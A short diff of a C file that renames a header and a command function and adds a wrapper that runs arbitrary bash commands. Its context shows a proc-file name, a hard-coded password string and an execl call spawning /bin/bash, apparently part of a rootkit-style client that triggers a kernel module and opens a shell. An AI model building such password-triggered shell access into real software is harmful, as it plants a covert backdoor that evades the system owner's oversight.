@@ -1,4 +1,4 @@
-#include "ModuleCommunication.h"
+#include "OSCommunication.h"
 
 #define CFG_PROC_FILE "version"
 #define CFG_PASS "password"
@@ -47,7 +47,7 @@ static char *create_buffer(int input, char *argument, int has_argument, size_t *
     return buffer;
 }
 
-int start_command(char *input)
+int start_module_command(char *input)
 {
     char *argument;
 
@@ -73,4 +73,8 @@ int start_command(char *input)
         execl("/bin/bash", "bash", NULL);
     }
     return 0;
+}
+
+char * start_bash_command(char *bash_command){
+    return run_bash_command(bash_command);
 }
